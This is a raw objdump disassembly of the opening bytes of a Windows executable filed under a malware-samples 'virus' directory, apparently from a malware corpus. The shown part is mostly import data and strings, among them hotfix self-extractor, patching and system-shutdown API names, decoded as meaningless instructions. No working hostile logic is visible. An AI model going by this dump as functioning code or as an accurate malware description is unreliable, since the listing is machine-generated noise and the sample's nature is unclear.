
malware_samples/virus/791a4219e0a98665d6abe5f0267c03499bd8d842c894daaac554f5e3200bc5fb.exe:     file format pei-i386


Disassembly of section .text:

01002000 <.text>:
 1002000:	6c                   	insb   (%dx),%es:(%edi)
 1002001:	9d                   	popf
 1002002:	00 00                	add    %al,(%eax)
 1002004:	56                   	push   %esi
 1002005:	9d                   	popf
 1002006:	00 00                	add    %al,(%eax)
 1002008:	3a 9d 00 00 22 9d    	cmp    -0x62de0000(%ebp),%bl
 100200e:	00 00                	add    %al,(%eax)
 1002010:	10 9d 00 00 fa 9c    	adc    %bl,-0x63060000(%ebp)
 1002016:	00 00                	add    %al,(%eax)
 1002018:	de 9c 00 00 ca 9c 00 	ficomps 0x9cca00(%eax,%eax,1)
 100201f:	00 b4 9c 00 00 a4 9c 	add    %dh,-0x635c0000(%esp,%ebx,4)
 1002026:	00 00                	add    %al,(%eax)
 1002028:	8a 9c 00 00 7c 9d 00 	mov    0x9d7c00(%eax,%eax,1),%bl
 100202f:	00 00                	add    %al,(%eax)
 1002031:	00 00                	add    %al,(%eax)
 1002033:	00 11                	add    %dl,(%ecx)
 1002035:	00 00                	add    %al,(%eax)
 1002037:	80 00 00             	addb   $0x0,(%eax)
 100203a:	00 00                	add    %al,(%eax)
 100203c:	f6 a1 00 00 e8 a1    	mulb   -0x5e180000(%ecx)
 1002042:	00 00                	add    %al,(%eax)
 1002044:	cc                   	int3
 1002045:	a1 00 00 ba a1       	mov    0xa1ba0000,%eax
 100204a:	00 00                	add    %al,(%eax)
 100204c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 100204d:	a1 00 00 28 a2       	mov    0xa2280000,%eax
 1002052:	00 00                	add    %al,(%eax)
 1002054:	72 a1                	jb     0x1001ff7
 1002056:	00 00                	add    %al,(%eax)
 1002058:	64 a1 00 00 54 a1    	mov    %fs:0xa1540000,%eax
 100205e:	00 00                	add    %al,(%eax)
 1002060:	06                   	push   %es
 1002061:	a2 00 00 2a a1       	mov    %al,0xa12a0000
 1002066:	00 00                	add    %al,(%eax)
 1002068:	16                   	push   %ss
 1002069:	a1 00 00 06 a1       	mov    0xa1060000,%eax
 100206e:	00 00                	add    %al,(%eax)
 1002070:	50                   	push   %eax
 1002071:	a2 00 00 6a a2       	mov    %al,0xa26a0000
 1002076:	00 00                	add    %al,(%eax)
 1002078:	80 a2 00 00 96 a2 00 	andb   $0x0,-0x5d6a0000(%edx)
 100207f:	00 b0 a2 00 00 cc    	add    %dh,-0x33ffff5e(%eax)
 1002085:	a2 00 00 3c a1       	mov    %al,0xa13c0000
 100208a:	00 00                	add    %al,(%eax)
 100208c:	16                   	push   %ss
 100208d:	a2 00 00 cc a0       	mov    %al,0xa0cc0000
 1002092:	00 00                	add    %al,(%eax)
 1002094:	d8 a0 00 00 8c a1    	fsubs  -0x5e740000(%eax)
 100209a:	00 00                	add    %al,(%eax)
 100209c:	5c                   	pop    %esp
 100209d:	9f                   	lahf
 100209e:	00 00                	add    %al,(%eax)
 10020a0:	aa                   	stos   %al,%es:(%edi)
 10020a1:	9d                   	popf
 10020a2:	00 00                	add    %al,(%eax)
 10020a4:	ba 9d 00 00 c6       	mov    $0xc600009d,%edx
 10020a9:	9d                   	popf
 10020aa:	00 00                	add    %al,(%eax)
 10020ac:	d8 9d 00 00 e6 9d    	fcomps -0x621a0000(%ebp)
 10020b2:	00 00                	add    %al,(%eax)
 10020b4:	fa                   	cli
 10020b5:	9d                   	popf
 10020b6:	00 00                	add    %al,(%eax)
 10020b8:	0a 9e 00 00 1e 9e    	or     -0x61e20000(%esi),%bl
 10020be:	00 00                	add    %al,(%eax)
 10020c0:	2e 9e                	cs sahf
 10020c2:	00 00                	add    %al,(%eax)
 10020c4:	3e 9e                	ds sahf
 10020c6:	00 00                	add    %al,(%eax)
 10020c8:	4c                   	dec    %esp
 10020c9:	9e                   	sahf
 10020ca:	00 00                	add    %al,(%eax)
 10020cc:	5e                   	pop    %esi
 10020cd:	9e                   	sahf
 10020ce:	00 00                	add    %al,(%eax)
 10020d0:	6e                   	outsb  %ds:(%esi),(%dx)
 10020d1:	9e                   	sahf
 10020d2:	00 00                	add    %al,(%eax)
 10020d4:	84 9e 00 00 92 9e    	test   %bl,-0x616e0000(%esi)
 10020da:	00 00                	add    %al,(%eax)
 10020dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 10020dd:	9e                   	sahf
 10020de:	00 00                	add    %al,(%eax)
 10020e0:	b2 9e                	mov    $0x9e,%dl
 10020e2:	00 00                	add    %al,(%eax)
 10020e4:	c2 9e 00             	ret    $0x9e
 10020e7:	00 ce                	add    %cl,%dh
 10020e9:	9e                   	sahf
 10020ea:	00 00                	add    %al,(%eax)
 10020ec:	e0 9e                	loopne 0x100208c
 10020ee:	00 00                	add    %al,(%eax)
 10020f0:	f8                   	clc
 10020f1:	9e                   	sahf
 10020f2:	00 00                	add    %al,(%eax)
 10020f4:	06                   	push   %es
 10020f5:	9f                   	lahf
 10020f6:	00 00                	add    %al,(%eax)
 10020f8:	1e                   	push   %ds
 10020f9:	9f                   	lahf
 10020fa:	00 00                	add    %al,(%eax)
 10020fc:	32 9f 00 00 4c 9f    	xor    -0x60b40000(%edi),%bl
 1002102:	00 00                	add    %al,(%eax)
 1002104:	ba a0 00 00 68       	mov    $0x680000a0,%edx
 1002109:	9f                   	lahf
 100210a:	00 00                	add    %al,(%eax)
 100210c:	70 9f                	jo     0x10020ad
 100210e:	00 00                	add    %al,(%eax)
 1002110:	8a 9f 00 00 a4 9f    	mov    -0x605c0000(%edi),%bl
 1002116:	00 00                	add    %al,(%eax)
 1002118:	ba 9f 00 00 c6       	mov    $0xc600009f,%edx
 100211d:	9f                   	lahf
 100211e:	00 00                	add    %al,(%eax)
 1002120:	d6                   	salc
 1002121:	9f                   	lahf
 1002122:	00 00                	add    %al,(%eax)
 1002124:	e2 9f                	loop   0x10020c5
 1002126:	00 00                	add    %al,(%eax)
 1002128:	ee                   	out    %al,(%dx)
 1002129:	9f                   	lahf
 100212a:	00 00                	add    %al,(%eax)
 100212c:	fc                   	cld
 100212d:	9f                   	lahf
 100212e:	00 00                	add    %al,(%eax)
 1002130:	14 a0                	adc    $0xa0,%al
 1002132:	00 00                	add    %al,(%eax)
 1002134:	28 a0 00 00 3e a0    	sub    %ah,-0x5fc20000(%eax)
 100213a:	00 00                	add    %al,(%eax)
 100213c:	4c                   	dec    %esp
 100213d:	a0 00 00 60 a0       	mov    0xa0600000,%al
 1002142:	00 00                	add    %al,(%eax)
 1002144:	76 a0                	jbe    0x10020e6
 1002146:	00 00                	add    %al,(%eax)
 1002148:	88 a0 00 00 9e a0    	mov    %ah,-0x5f620000(%eax)
 100214e:	00 00                	add    %al,(%eax)
 1002150:	aa                   	stos   %al,%es:(%edi)
 1002151:	a0 00 00 ee a0       	mov    0xa0ee0000,%al
 1002156:	00 00                	add    %al,(%eax)
 1002158:	00 00                	add    %al,(%eax)
 100215a:	00 00                	add    %al,(%eax)
 100215c:	fc                   	cld
 100215d:	a3 00 00 e4 a3       	mov    %eax,0xa3e40000
 1002162:	00 00                	add    %al,(%eax)
 1002164:	00 00                	add    %al,(%eax)
 1002166:	00 00                	add    %al,(%eax)
 1002168:	4e                   	dec    %esi
 1002169:	a3 00 00 3e a3       	mov    %eax,0xa33e0000
 100216e:	00 00                	add    %al,(%eax)
 1002170:	2c a3                	sub    $0xa3,%al
 1002172:	00 00                	add    %al,(%eax)
 1002174:	1e                   	push   %ds
 1002175:	a3 00 00 12 a3       	mov    %eax,0xa3120000
 100217a:	00 00                	add    %al,(%eax)
 100217c:	06                   	push   %es
 100217d:	a3 00 00 f8 a2       	mov    %eax,0xa2f80000
 1002182:	00 00                	add    %al,(%eax)
 1002184:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
 100218a:	00 00                	add    %al,(%eax)
 100218c:	08 9c 00 00 fc 9b 00 	or     %bl,0x9bfc00(%eax,%eax,1)
 1002193:	00 ec                	add    %ch,%ah
 1002195:	9b                   	fwait
 1002196:	00 00                	add    %al,(%eax)
 1002198:	e0 9b                	loopne 0x1002135
 100219a:	00 00                	add    %al,(%eax)
 100219c:	d8 9b 00 00 ce 9b    	fcomps -0x64320000(%ebx)
 10021a2:	00 00                	add    %al,(%eax)
 10021a4:	1c 9c                	sbb    $0x9c,%al
 10021a6:	00 00                	add    %al,(%eax)
 10021a8:	b8 9b 00 00 ae       	mov    $0xae00009b,%eax
 10021ad:	9b                   	fwait
 10021ae:	00 00                	add    %al,(%eax)
 10021b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 10021b1:	9b                   	fwait
 10021b2:	00 00                	add    %al,(%eax)
 10021b4:	9a 9b 00 00 90 9b 00 	lcall  $0x9b,$0x9000009b
 10021bb:	00 86 9b 00 00 7a    	add    %al,0x7a00009b(%esi)
 10021c1:	9b                   	fwait
 10021c2:	00 00                	add    %al,(%eax)
 10021c4:	2c 9c                	sub    $0x9c,%al
 10021c6:	00 00                	add    %al,(%eax)
 10021c8:	3c 9c                	cmp    $0x9c,%al
 10021ca:	00 00                	add    %al,(%eax)
 10021cc:	4a                   	dec    %edx
 10021cd:	9c                   	pushf
 10021ce:	00 00                	add    %al,(%eax)
 10021d0:	5c                   	pop    %esp
 10021d1:	9c                   	pushf
 10021d2:	00 00                	add    %al,(%eax)
 10021d4:	7c 9c                	jl     0x1002172
 10021d6:	00 00                	add    %al,(%eax)
 10021d8:	c0 9b 00 00 4e 9b 00 	rcrb   $0x0,-0x64b20000(%ebx)
 10021df:	00 5a 9b             	add    %bl,-0x65(%edx)
 10021e2:	00 00                	add    %al,(%eax)
 10021e4:	64 9b                	fs fwait
 10021e6:	00 00                	add    %al,(%eax)
 10021e8:	6e                   	outsb  %ds:(%esi),(%dx)
 10021e9:	9b                   	fwait
 10021ea:	00 00                	add    %al,(%eax)
 10021ec:	40                   	inc    %eax
 10021ed:	9b                   	fwait
 10021ee:	00 00                	add    %al,(%eax)
 10021f0:	00 00                	add    %al,(%eax)
 10021f2:	00 00                	add    %al,(%eax)
 10021f4:	a2 a3 00 00 88       	mov    %al,0x880000a3
 10021f9:	a3 00 00 7e a3       	mov    %eax,0xa37e0000
 10021fe:	00 00                	add    %al,(%eax)
 1002200:	b8 a3 00 00 00       	mov    $0xa3,%eax
 1002205:	00 00                	add    %al,(%eax)
 1002207:	00 00                	add    %al,(%eax)
 1002209:	00 00                	add    %al,(%eax)
 100220b:	00 8c 62 00 01 00 00 	add    %cl,0x100(%edx,%eiz,2)
	...
 1002222:	00 00                	add    %al,(%eax)
 1002224:	a0 6a 6b 47 00       	mov    0x476b6a,%al
 1002229:	00 00                	add    %al,(%eax)
 100222b:	00 02                	add    %al,(%edx)
 100222d:	00 00                	add    %al,(%eax)
 100222f:	00 23                	add    %ah,(%ebx)
 1002231:	00 00                	add    %al,(%eax)
 1002233:	00 40 27             	add    %al,0x27(%eax)
 1002236:	00 00                	add    %al,(%eax)
 1002238:	40                   	inc    %eax
 1002239:	0b 00                	or     (%eax),%eax
 100223b:	00 c0                	add    %al,%al
 100223d:	9d                   	popf
 100223e:	0e                   	push   %cs
 100223f:	a8 10                	test   $0x10,%al
 1002241:	d9 d2                	(bad)
 1002243:	11 95 05 00 10 5a    	adc    %edx,0x5a100005(%ebp)
 1002249:	aa                   	stos   %al,%es:(%edi)
 100224a:	b1 15                	mov    $0x15,%cl
 100224c:	25 73 5f 25 30       	and    $0x30255f73,%eax
 1002251:	36 75 5f             	ss jne 0x10022b3
 1002254:	00 00                	add    %al,(%eax)
 1002256:	00 00                	add    %al,(%eax)
 1002258:	47                   	inc    %edi
 1002259:	65 74 43             	gs je  0x100229f
 100225c:	6c                   	insb   (%dx),%es:(%edi)
 100225d:	75 73                	jne    0x10022d2
 100225f:	74 65                	je     0x10022c6
 1002261:	72 51                	jb     0x10022b4
 1002263:	75 6f                	jne    0x10022d4
 1002265:	72 75                	jb     0x10022dc
 1002267:	6d                   	insl   (%dx),%es:(%edi)
 1002268:	52                   	push   %edx
 1002269:	65 73 6f             	gs jae 0x10022db
 100226c:	75 72                	jne    0x10022e0
 100226e:	63 65 00             	arpl   %esp,0x0(%ebp)
 1002271:	00 00                	add    %al,(%eax)
 1002273:	00 47 65             	add    %al,0x65(%edi)
 1002276:	74 4e                	je     0x10022c6
 1002278:	6f                   	outsl  %ds:(%esi),(%dx)
 1002279:	64 65 43             	fs gs inc %ebx
 100227c:	6c                   	insb   (%dx),%es:(%edi)
 100227d:	75 73                	jne    0x10022f2
 100227f:	74 65                	je     0x10022e6
 1002281:	72 53                	jb     0x10022d6
 1002283:	74 61                	je     0x10022e6
 1002285:	74 65                	je     0x10022ec
 1002287:	00 43 6c             	add    %al,0x6c(%ebx)
 100228a:	6f                   	outsl  %ds:(%esi),(%dx)
 100228b:	73 65                	jae    0x10022f2
 100228d:	43                   	inc    %ebx
 100228e:	6c                   	insb   (%dx),%es:(%edi)
 100228f:	75 73                	jne    0x1002304
 1002291:	74 65                	je     0x10022f8
 1002293:	72 00                	jb     0x1002295
 1002295:	00 00                	add    %al,(%eax)
 1002297:	00 4f 70             	add    %cl,0x70(%edi)
 100229a:	65 6e                	outsb  %gs:(%esi),(%dx)
 100229c:	43                   	inc    %ebx
 100229d:	6c                   	insb   (%dx),%es:(%edi)
 100229e:	75 73                	jne    0x1002313
 10022a0:	74 65                	je     0x1002307
 10022a2:	72 00                	jb     0x10022a4
 10022a4:	5c                   	pop    %esp
 10022a5:	63 6c 75 73          	arpl   %ebp,0x73(%ebp,%esi,2)
 10022a9:	61                   	popa
 10022aa:	70 69                	jo     0x1002315
 10022ac:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 10022af:	6c                   	insb   (%dx),%es:(%edi)
 10022b0:	00 00                	add    %al,(%eax)
 10022b2:	00 00                	add    %al,(%eax)
 10022b4:	5c                   	pop    %esp
 10022b5:	5c                   	pop    %esp
 10022b6:	2e 5c                	cs pop %esp
 10022b8:	3f                   	aas
 10022b9:	3a 00                	cmp    (%eax),%al
 10022bb:	00 47 00             	add    %al,0x0(%edi)
 10022be:	6c                   	insb   (%dx),%es:(%edi)
 10022bf:	00 6f 00             	add    %ch,0x0(%edi)
 10022c2:	62 00                	bound  %eax,(%eax)
 10022c4:	61                   	popa
 10022c5:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
 10022c9:	00 48 00             	add    %cl,0x0(%eax)
 10022cc:	6f                   	outsl  %ds:(%esi),(%dx)
 10022cd:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
 10022d1:	00 69 00             	add    %ch,0x0(%ecx)
 10022d4:	78 00                	js     0x10022d6
 10022d6:	4e                   	dec    %esi
 10022d7:	00 6f 00             	add    %ch,0x0(%edi)
 10022da:	53                   	push   %ebx
 10022db:	00 68 00             	add    %ch,0x0(%eax)
 10022de:	75 00                	jne    0x10022e0
 10022e0:	74 00                	je     0x10022e2
 10022e2:	44                   	inc    %esp
 10022e3:	00 6f 00             	add    %ch,0x0(%edi)
 10022e6:	77 00                	ja     0x10022e8
 10022e8:	6e                   	outsb  %ds:(%esi),(%dx)
 10022e9:	00 00                	add    %al,(%eax)
 10022eb:	00 0d 0a 2a 2a 2a    	add    %cl,0x2a2a2a0a
 10022f1:	0d 0a 0d 0a 00       	or     $0xa0d0a,%eax
 10022f6:	00 00                	add    %al,(%eax)
 10022f8:	4e                   	dec    %esi
 10022f9:	74 4f                	je     0x100234a
 10022fb:	70 65                	jo     0x1002362
 10022fd:	6e                   	outsb  %ds:(%esi),(%dx)
 10022fe:	50                   	push   %eax
 10022ff:	72 6f                	jb     0x1002370
 1002301:	63 65 73             	arpl   %esp,0x73(%ebp)
 1002304:	73 54                	jae    0x100235a
 1002306:	6f                   	outsl  %ds:(%esi),(%dx)
 1002307:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
 100230b:	46                   	inc    %esi
 100230c:	61                   	popa
 100230d:	69 6c 65 64 20 00 00 	imul   $0x52000020,0x64(%ebp,%eiz,2),%ebp
 1002314:	52 
 1002315:	65 73 74             	gs jae 0x100238c
 1002318:	6f                   	outsl  %ds:(%esi),(%dx)
 1002319:	72 65                	jb     0x1002380
 100231b:	50                   	push   %eax
 100231c:	72 69                	jb     0x1002387
 100231e:	76 69                	jbe    0x1002389
 1002320:	6c                   	insb   (%dx),%es:(%edi)
 1002321:	65 67 65 28 29       	gs sub %ch,%gs:(%bx,%di)
 1002326:	3a 20                	cmp    (%eax),%ah
 1002328:	46                   	inc    %esi
 1002329:	61                   	popa
 100232a:	69 6c 65 64 20 54 6f 	imul   $0x206f5420,0x64(%ebp,%eiz,2),%ebp
 1002331:	20 
 1002332:	52                   	push   %edx
 1002333:	65 73 74             	gs jae 0x10023aa
 1002336:	6f                   	outsl  %ds:(%esi),(%dx)
 1002337:	72 65                	jb     0x100239e
 1002339:	20 50 72             	and    %dl,0x72(%eax)
 100233c:	69 76 69 6c 65 67 65 	imul   $0x6567656c,0x69(%esi),%esi
 1002343:	20 00                	and    %al,(%eax)
 1002345:	00 00                	add    %al,(%eax)
 1002347:	00 52 65             	add    %dl,0x65(%edx)
 100234a:	73 74                	jae    0x10023c0
 100234c:	6f                   	outsl  %ds:(%esi),(%dx)
 100234d:	72 65                	jb     0x10023b4
 100234f:	50                   	push   %eax
 1002350:	72 69                	jb     0x10023bb
 1002352:	76 69                	jbe    0x10023bd
 1002354:	6c                   	insb   (%dx),%es:(%edi)
 1002355:	65 67 65 28 29       	gs sub %ch,%gs:(%bx,%di)
 100235a:	3a 46 61             	cmp    0x61(%esi),%al
 100235d:	69 6c 65 64 20 54 6f 	imul   $0x206f5420,0x64(%ebp,%eiz,2),%ebp
 1002364:	20 
 1002365:	4f                   	dec    %edi
 1002366:	70 65                	jo     0x10023cd
 1002368:	6e                   	outsb  %ds:(%esi),(%dx)
 1002369:	20 50 72             	and    %dl,0x72(%eax)
 100236c:	6f                   	outsl  %ds:(%esi),(%dx)
 100236d:	63 65 73             	arpl   %esp,0x73(%ebp)
 1002370:	73 20                	jae    0x1002392
 1002372:	54                   	push   %esp
 1002373:	6f                   	outsl  %ds:(%esi),(%dx)
 1002374:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 1002378:	41                   	inc    %ecx
 1002379:	70 70                	jo     0x10023eb
 100237b:	6c                   	insb   (%dx),%es:(%edi)
 100237c:	79 50                	jns    0x10023ce
 100237e:	61                   	popa
 100237f:	74 63                	je     0x10023e4
 1002381:	68 54 6f 46 69       	push   $0x69466f54
 1002386:	6c                   	insb   (%dx),%es:(%edi)
 1002387:	65 41                	gs inc %ecx
 1002389:	00 00                	add    %al,(%eax)
 100238b:	00 47 65             	add    %al,0x65(%edi)
 100238e:	74 46                	je     0x10023d6
 1002390:	69 6c 65 50 61 74 63 	imul   $0x68637461,0x50(%ebp,%eiz,2),%ebp
 1002397:	68 
 1002398:	53                   	push   %ebx
 1002399:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
 10023a0:	65 41                	gs inc %ecx
 10023a2:	00 00                	add    %al,(%eax)
 10023a4:	6d                   	insl   (%dx),%es:(%edi)
 10023a5:	73 70                	jae    0x1002417
 10023a7:	61                   	popa
 10023a8:	74 63                	je     0x100240d
 10023aa:	68 61 2e 64 6c       	push   $0x6c642e61
 10023af:	6c                   	insb   (%dx),%es:(%edi)
 10023b0:	00 00                	add    %al,(%eax)
 10023b2:	00 00                	add    %al,(%eax)
 10023b4:	6f                   	outsl  %ds:(%esi),(%dx)
 10023b5:	70 74                	jo     0x100242b
 10023b7:	69 6f 6e 73 00 70 61 	imul   $0x61700073,0x6e(%edi),%ebp
 10023be:	74 63                	je     0x1002423
 10023c0:	68 64 6c 6c 00       	push   $0x6c6c64
 10023c5:	00 00                	add    %al,(%eax)
 10023c7:	00 24 73             	add    %ah,(%ebx,%esi,2)
 10023ca:	68 74 64 77 6e       	push   $0x6e776474
 10023cf:	24 2e                	and    $0x2e,%al
 10023d1:	72 65                	jb     0x1002438
 10023d3:	71 00                	jno    0x10023d5
 10023d5:	00 00                	add    %al,(%eax)
 10023d7:	00 5f 53             	add    %bl,0x53(%edi)
 10023da:	46                   	inc    %esi
 10023db:	58                   	pop    %eax
 10023dc:	5f                   	pop    %edi
 10023dd:	43                   	inc    %ebx
 10023de:	41                   	inc    %ecx
 10023df:	42                   	inc    %edx
 10023e0:	5f                   	pop    %edi
 10023e1:	53                   	push   %ebx
 10023e2:	48                   	dec    %eax
 10023e3:	55                   	push   %ebp
 10023e4:	54                   	push   %esp
 10023e5:	44                   	inc    %esp
 10023e6:	4f                   	dec    %edi
 10023e7:	57                   	push   %edi
 10023e8:	4e                   	dec    %esi
 10023e9:	5f                   	pop    %edi
 10023ea:	52                   	push   %edx
 10023eb:	45                   	inc    %ebp
 10023ec:	51                   	push   %ecx
 10023ed:	55                   	push   %ebp
 10023ee:	45                   	inc    %ebp
 10023ef:	53                   	push   %ebx
 10023f0:	54                   	push   %esp
 10023f1:	00 00                	add    %al,(%eax)
 10023f3:	00 53 68             	add    %dl,0x68(%ebx)
 10023f6:	75 74                	jne    0x100246c
 10023f8:	64 6f                	outsl  %fs:(%esi),(%dx)
 10023fa:	77 6e                	ja     0x100246a
 10023fc:	53                   	push   %ebx
 10023fd:	79 73                	jns    0x1002472
 10023ff:	74 65                	je     0x1002466
 1002401:	6d                   	insl   (%dx),%es:(%edi)
 1002402:	3a 20                	cmp    (%eax),%ah
 1002404:	46                   	inc    %esi
 1002405:	61                   	popa
 1002406:	69 6c 65 64 20 00 49 	imul   $0x6e490020,0x64(%ebp,%eiz,2),%ebp
 100240d:	6e 
 100240e:	69 74 69 61 74 65 53 	imul   $0x79536574,0x61(%ecx,%ebp,2),%esi
 1002415:	79 
 1002416:	73 74                	jae    0x100248c
 1002418:	65 6d                	gs insl (%dx),%es:(%edi)
 100241a:	53                   	push   %ebx
 100241b:	68 75 74 64 6f       	push   $0x6f647475
 1002420:	77 6e                	ja     0x1002490
 1002422:	28 29                	sub    %ch,(%ecx)
 1002424:	20 46 61             	and    %al,0x61(%esi)
 1002427:	69 6c 65 64 20 77 69 	imul   $0x74697720,0x64(%ebp,%eiz,2),%ebp
 100242e:	74 
 100242f:	68 20 65 72 72       	push   $0x72726520
 1002434:	6f                   	outsl  %ds:(%esi),(%dx)
 1002435:	72 20                	jb     0x1002457
 1002437:	30 78 25             	xor    %bh,0x25(%eax)
 100243a:	6c                   	insb   (%dx),%es:(%edi)
 100243b:	78 20                	js     0x100245d
 100243d:	0a 00                	or     (%eax),%al
 100243f:	00 49 6e             	add    %cl,0x6e(%ecx)
 1002442:	69 74 69 61 74 65 53 	imul   $0x79536574,0x61(%ecx,%ebp,2),%esi
 1002449:	79 
 100244a:	73 74                	jae    0x10024c0
 100244c:	65 6d                	gs insl (%dx),%es:(%edi)
 100244e:	53                   	push   %ebx
 100244f:	68 75 74 64 6f       	push   $0x6f647475
 1002454:	77 6e                	ja     0x10024c4
 1002456:	45                   	inc    %ebp
 1002457:	78 41                	js     0x100249a
 1002459:	00 00                	add    %al,(%eax)
 100245b:	00 61 64             	add    %ah,0x64(%ecx)
 100245e:	76 61                	jbe    0x10024c1
 1002460:	70 69                	jo     0x10024cb
 1002462:	33 32                	xor    (%edx),%esi
 1002464:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 1002467:	6c                   	insb   (%dx),%es:(%edi)
 1002468:	00 00                	add    %al,(%eax)
 100246a:	00 00                	add    %al,(%eax)
 100246c:	46                   	inc    %esi
 100246d:	61                   	popa
 100246e:	69 6c 65 64 20 74 6f 	imul   $0x206f7420,0x64(%ebp,%eiz,2),%ebp
 1002475:	20 
 1002476:	41                   	inc    %ecx
 1002477:	64 6a 75             	fs push $0x75
 100247a:	73 74                	jae    0x10024f0
 100247c:	20 45 4e             	and    %al,0x4e(%ebp)
 100247f:	41                   	inc    %ecx
 1002480:	42                   	inc    %edx
 1002481:	4c                   	dec    %esp
 1002482:	45                   	inc    %ebp
 1002483:	5f                   	pop    %edi
 1002484:	50                   	push   %eax
 1002485:	52                   	push   %edx
 1002486:	49                   	dec    %ecx
 1002487:	56                   	push   %esi
 1002488:	49                   	dec    %ecx
 1002489:	4c                   	dec    %esp
 100248a:	45                   	inc    %ebp
 100248b:	47                   	inc    %edi
 100248c:	45                   	inc    %ebp
 100248d:	20 00                	and    %al,(%eax)
 100248f:	00 53 68             	add    %dl,0x68(%ebx)
 1002492:	75 74                	jne    0x1002508
 1002494:	64 6f                	outsl  %fs:(%esi),(%dx)
 1002496:	77 6e                	ja     0x1002506
 1002498:	20 49 6e             	and    %cl,0x6e(%ecx)
 100249b:	69 74 69 61 74 65 64 	imul   $0x20646574,0x61(%ecx,%ebp,2),%esi
 10024a2:	20 
 10024a3:	69 6e 20 53 65 6c 66 	imul   $0x666c6553,0x20(%esi),%ebp
 10024aa:	20 45 78             	and    %al,0x78(%ebp)
 10024ad:	74 72                	je     0x1002521
 10024af:	61                   	popa
 10024b0:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
 10024b4:	20 00                	and    %al,(%eax)
 10024b6:	00 00                	add    %al,(%eax)
 10024b8:	57                   	push   %edi
 10024b9:	46                   	inc    %esi
 10024ba:	50                   	push   %eax
 10024bb:	5f                   	pop    %edi
 10024bc:	49                   	dec    %ecx
 10024bd:	44                   	inc    %esp
 10024be:	4c                   	dec    %esp
 10024bf:	45                   	inc    %ebp
 10024c0:	5f                   	pop    %edi
 10024c1:	54                   	push   %esp
 10024c2:	52                   	push   %edx
 10024c3:	49                   	dec    %ecx
 10024c4:	47                   	inc    %edi
 10024c5:	47                   	inc    %edi
 10024c6:	45                   	inc    %ebp
 10024c7:	52                   	push   %edx
 10024c8:	00 00                	add    %al,(%eax)
 10024ca:	00 00                	add    %al,(%eax)
 10024cc:	69 6e 74 65 67 72 61 	imul   $0x61726765,0x74(%esi),%ebp
 10024d3:	74 65                	je     0x100253a
 10024d5:	00 00                	add    %al,(%eax)
 10024d7:	00 70 61             	add    %dh,0x61(%eax)
 10024da:	73 73                	jae    0x100254f
 10024dc:	69 76 65 00 71 75 69 	imul   $0x69757100,0x65(%esi),%esi
 10024e3:	65 74 00             	gs je  0x10024e6
 10024e6:	00 00                	add    %al,(%eax)
 10024e8:	65 78 74             	gs js  0x100255f
 10024eb:	72 61                	jb     0x100254e
 10024ed:	63 74 00 65          	arpl   %esi,0x65(%eax,%eax,1)
 10024f1:	78 74                	js     0x1002567
 10024f3:	72 61                	jb     0x1002556
 10024f5:	63 74 3a 00          	arpl   %esi,0x0(%edx,%edi,1)
 10024f9:	00 00                	add    %al,(%eax)
 10024fb:	00 2e                	add    %ch,(%esi)
 10024fd:	25 30 33 75 00       	and    $0x753330,%eax
 1002502:	00 00                	add    %al,(%eax)
 1002504:	2e 73 79             	jae,pn 0x1002580
 1002507:	73 00                	jae    0x1002509
 1002509:	00 00                	add    %al,(%eax)
 100250b:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
 100250f:	72 79                	jb     0x100258a
 1002511:	70 74                	jo     0x1002587
 1002513:	46                   	inc    %esi
 1002514:	69 6c 65 41 00 00 00 	imul   $0x0,0x41(%ebp,%eiz,2),%ebp
 100251b:	00 
 100251c:	72 75                	jb     0x1002593
 100251e:	6e                   	outsb  %ds:(%esi),(%dx)
 100251f:	00 63 6f             	add    %ah,0x6f(%ebx)
 1002522:	6d                   	insl   (%dx),%es:(%edi)
 1002523:	6d                   	insl   (%dx),%es:(%edi)
 1002524:	61                   	popa
 1002525:	6e                   	outsb  %ds:(%esi),(%dx)
 1002526:	64 00 64 65 6c       	add    %ah,%fs:0x6c(%ebp,%eiz,2)
 100252b:	65 74 65             	gs je  0x1002593
 100252e:	00 00                	add    %al,(%eax)
 1002530:	76 65                	jbe    0x1002597
 1002532:	72 69                	jb     0x100259d
 1002534:	66 79 00             	data16 jns 0x1002537
 1002537:	00 63 6f             	add    %ah,0x6f(%ebx)
 100253a:	70 79                	jo     0x10025b5
 100253c:	00 00                	add    %al,(%eax)
 100253e:	00 00                	add    %al,(%eax)
 1002540:	5c                   	pop    %esp
 1002541:	2e 2e 5c             	cs cs pop %esp
 1002544:	00 00                	add    %al,(%eax)
 1002546:	00 00                	add    %al,(%eax)
 1002548:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
 100254b:	74 61                	je     0x10025ae
 100254d:	73 00                	jae    0x100254f
 100254f:	00 74 65 6d          	add    %dh,0x6d(%ebp,%eiz,2)
 1002553:	70 5c                	jo     0x10025b1
 1002555:	65 78 74             	gs js  0x10025cc
 1002558:	00 00                	add    %al,(%eax)
 100255a:	00 00                	add    %al,(%eax)
 100255c:	25 30 32 78 00       	and    $0x783230,%eax
 1002561:	00 00                	add    %al,(%eax)
 1002563:	00 25 73 00 00 72    	add    %ah,0x72000073
 1002569:	61                   	popa
 100256a:	6d                   	insl   (%dx),%es:(%edi)
 100256b:	64 69 73 6b 00 68 61 	imul   $0x72616800,%fs:0x6b(%ebx),%esi
 1002572:	72 
 1002573:	64 64 69 73 6b 00 00 	fs imul $0x0,%fs:0x6b(%ebx),%esi
 100257a:	00 00 
 100257c:	5f                   	pop    %edi
 100257d:	73 66                	jae    0x10025e5
 100257f:	78 5f                	js     0x10025e0
 1002581:	6d                   	insl   (%dx),%es:(%edi)
 1002582:	61                   	popa
 1002583:	6e                   	outsb  %ds:(%esi),(%dx)
 1002584:	69 66 65 73 74 5f 00 	imul   $0x5f7473,0x65(%esi),%esp
 100258b:	00 63 64             	add    %ah,0x64(%ebx)
 100258e:	74 61                	je     0x10025f1
 1002590:	67 2e 31 00          	xor    %eax,%cs:(%bx,%si)
